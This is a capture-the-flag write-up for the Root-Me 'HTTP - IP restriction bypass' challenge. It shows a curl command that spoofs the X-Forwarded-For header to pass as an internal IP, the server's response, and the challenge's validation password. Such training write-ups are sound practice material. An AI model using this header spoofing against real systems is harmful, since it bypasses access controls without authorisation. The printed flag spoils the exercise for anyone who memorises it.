---
title: HTTP - IP restriction bypass
author: thanguyen165
date: 2023-01-02 07:00:00 +0700
categories: [Practice, rootme]
tags: [Web Exploitation]
---

* Points: 10
* Link: [https://www.root-me.org/en/Challenges/Web-Server/HTTP-IP-restriction-bypass](https://www.root-me.org/en/Challenges/Web-Server/HTTP-IP-restriction-bypass)

## Statement

> Dear colleagues,  
> We’re now managing connections to the intranet using private IP addresses, so it’s no longer necessary to login with a username / password when you are already connected to the internal company network.  
> Regards,  
> The network admin

## Solution

Visit the site, we cannot login to it. But we do see a title:
```html
Your IP ::ffff:xxx.xxx.xx.xxx do not belong to the LAN.
```

So I try with some IPs address: ```127.0.0.1```, ```192.168.1.0```, ... and I found ```192.168.1.0``` works.

```sh
curl -H "X-Forwarded-For: 192.168.1.0" http://challenge01.root-me.org/web-serveur/ch68/
```

```html
<!DOCTYPE html>
<html>
<head>
        <title>Secured Intranet</title>
</head>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
                        <h1>Intranet</h1>
                <div>
                        Well done, the validation password is: <strong>Ip_$po0Fing
</strong>
                </div>
        </body>
</html>
```

The flag is
```
Ip_$po0Fing
```
